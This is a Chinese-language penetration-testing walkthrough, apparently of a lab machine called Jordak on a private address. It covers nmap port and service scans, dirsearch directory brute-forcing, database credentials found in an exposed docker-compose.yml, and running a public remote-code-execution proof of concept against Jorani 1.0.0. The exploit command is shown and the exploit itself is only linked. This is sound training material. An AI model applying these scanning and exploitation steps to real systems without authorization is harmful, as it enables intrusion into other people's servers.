针对目标服务器进行相应的端口扫描

```
sudo nmap -p- -vvv --min-rate 10000 192.168.192.109
```

![image-20241204220429447](https://s2.loli.net/2024/12/04/tnQupsCcy7ZRzXY.png)

针对开放端口进行相应的服务扫描

```
sudo nmap -p22,80 -A 192.168.192.109 -oG Jordak.txt
```

![image-20241204220445806](https://s2.loli.net/2024/12/04/jqKZVp8blHG3YAB.png)

22端口相应的openssh对应的版本不存在可以直接利用的漏洞内容，我们奖重点放到80端口，优先针对80端口进行相应的端口扫描

```
dirsearch -u http://192.168.192.109
```

![image-20241204221004136](https://files.seeusercontent.com/2026/04/08/Bx6z/image-20241204221004136_compress.jpg)

```
dirsearch -u http://192.168.192.109 -w /usr/share/wordlists/dirb/big.txt -f -e php,txt,html
```

![image-20241204222629423](https://s2.loli.net/2024/12/04/pu6TclKkPDahq1g.png)

扫描得到了非常多的目录，我们逐个进行查看

![image-20241204221630484](https://s2.loli.net/2024/12/04/dMhu9lE7SJwWqQp.png)

我们根据docker-compose.yml获取到一组数据库信息

```
MYSQL_ROOT_PASSWORD=jorani
MYSQL_DATABASE=jorani
MYSQL_USER=jorani
MYSQL_PASSWORD=jorani
```

![image-20241204222705451](https://s2.loli.net/2024/12/04/YPeHox9svrDJuWm.png)

我们通过Google搜索该软件jorani（https://github.com/bbalet/jorani?tab=readme-ov-file）

我们访问index.php页面

![image-20241204222902084](https://s2.loli.net/2024/12/04/7GvuWlmc9xIJbia.png)

可以看到运行的是1.0.0版本，我们可以利用上面再dockers-compose中的账号密码进行登录尝试

![image-20241204223441647](https://s2.loli.net/2024/12/04/jYIbaHPhdokrpRL.png)

登录显示账号被disabled，我们根据版本来搜索是否存在可以利用的漏洞

![image-20241204223538590](https://s2.loli.net/2024/12/04/Q1wE9Xd7pfUtGmA.png)

存在一个RCE漏洞可以利用（https://github.com/Orange-Cyberdefense/CVE-repository/blob/master/PoCs/CVE_Jorani.py）

```
python exploit.py http://192.168.192.109/
```

![image-20241204224506186](https://s2.loli.net/2024/12/04/3IKV7yUBnbRXTqP.png)
